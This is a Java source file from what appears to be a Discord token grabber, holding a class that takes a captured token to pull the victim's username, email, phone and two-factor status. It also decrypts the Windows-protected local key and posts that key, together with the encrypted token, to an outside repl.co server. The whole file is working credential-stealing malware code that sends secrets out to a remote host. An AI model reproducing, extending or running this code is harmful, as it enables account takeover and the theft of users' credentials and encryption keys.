package com.github.dedinc.discordtokengrabber.utils;

import com.sun.jna.platform.win32.Crypt32Util;
import org.json.JSONObject;
import java.util.Arrays;
import java.util.Base64;

public class Checker {

    public static String osKey = null;

    public String checkUser(String token) {
        JSONObject response = new JSONObject(Helper.getRequest().get("https://discordapp.com/api/v9/users/@me", token));
        String info = "===User Info===\n\n\n";
        String username = String.format("%s#%s", response.getString("username"), response.getString("discriminator"));
        String bio = response.getString("bio");
        String email = response.getString("email");
        Boolean twofa = response.getBoolean("mfa_enabled");
        Boolean verified = response.getBoolean("verified");
        info += "Username: " + username;
        info += "\nBio: " + bio;
        info += "\nEmail: " + email;
        try {
            info += "\nPhone: " + response.getString("phone");
        } catch (Exception e) {}
        return String.format(info + "\n2FA: %b\nVerified: %b\n\nToken: %s", twofa, verified, token);
    }

    public String decryptToken(String token) {
        byte[] bytes = Base64.getDecoder().decode(osKey.getBytes());
        String encryptedBytes = new String(Base64.getEncoder().encode(Crypt32Util.cryptUnprotectData(Arrays.copyOfRange(bytes, 5, bytes.length))));
        JSONObject json = new JSONObject();
        json.put("key", encryptedBytes);
        json.put("token", new String(Base64.getEncoder().encode(token.getBytes())));
        return new JSONObject(Helper.getRequest().post("https://decryptionserver.ixixlliilxilili.repl.co", json)).getString("token");
    }
}
